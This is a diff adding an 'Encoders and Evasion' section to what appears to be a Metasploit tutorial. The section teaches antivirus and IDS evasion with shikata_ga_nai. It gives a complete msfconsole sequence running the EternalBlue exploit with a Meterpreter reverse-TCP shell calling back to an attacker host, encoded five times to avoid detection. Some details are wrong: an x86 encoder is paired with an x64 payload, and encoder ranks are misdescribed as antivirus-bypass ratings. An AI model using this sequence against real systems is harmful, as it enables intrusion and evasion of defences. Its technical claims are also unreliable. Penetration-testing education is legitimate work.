@@ -1470,5 +1470,84 @@ workspace -a TargetCorp_COMPLETED
 
 
 
+# 7. Encoders and Evasion
 
+### What Are Encoders?
+
+- Encoders transform a payload into a different representation to avoid detection by antivirus (AV) and intrusion detection systems (IDS). They don't make payloads "undetectable forever," but they can help evade signature-based detection.
+
+**Common use cases:**
+- Bypassing simple antivirus signatures
+- Avoiding character blacklists in exploits
+- Shrinking or expanding payload size
+
+> **Important:** Modern EDR (Endpoint Detection and Response) is not fooled by basic encoding. Use encoders as one layer, not your only defense.
+
+---
+
+### Finding Encoders
+
+| Command | Purpose |
+|---------|---------|
+| `show encoders` | List all available encoders |
+| `msfvenom -l encoders` | List encoders from command line |
+
+**Example output:**
+```text
+msf6 > show encoders
+```
+
+### Compatible Encoders
+    ===================
+  | Name     |               Rank   |    Description|
+ |  ----              |      ----     |  -----------|
+  | cmd/brace    |           low   |     Brace Expansion|
+  | cmd/echo  |             low    |    Echo Command|
+  | generic/none    |        normal |    The "none" Encoder|
+  | x86/shikata_ga_nai    |  excellent  |Polymorphic XOR Additive Feedback Encoder|
+
+
+## Encoder Rankings
+
+|Rank	|Meaning	|Reliability|
+|----|----|----|
+|excellent	|Very reliable, should bypass most signature-based AV|	Best choice|
+|great|	Reliable, good for most situations|	Good choice|
+|good	|Works in many cases	|Decent choice|
+|normal	|Standard, might be detected	|Try if others fail|
+|low	|Rarely works, old signatures	|Last resort|
+|manual	|Requires manual tweaking	|Advanced users only|
+
+
+## The Most Useful Encoder: shikata_ga_nai
+
+x86/shikata_ga_nai (Japanese for "it can't be helped") 
+- is the most popular encoder in Metasploit. It's polymorphic—each generated payload looks different.
+
+- **Why it works:**
+
+  - XOR encryption with random keys
+
+  - Multiple iterations change the payload each time
+
+  -  Self-decrypting code evades simple pattern matching
+ 
+
+ ## Using Encoders in msfconsole
+
+- When setting a payload for an exploit, you can also set an encoder:
+```bash
+ use exploit/windows/smb/ms17_010_eternalblue
+ set payload windows/x64/meterpreter/reverse_tcp
+ set LHOST 192.168.1.5
+ set LPORT 4444
+ show encoders
+ set encoder x86/shikata_ga_nai
+ set iterations 5
+ run
+```
+|Parameter	|Purpose|
+|----|----|
+|set encoder [name]|	Choose which encoder to use|
+|set iterations [number]|	How many times to encode (1-10, default 1)|
 
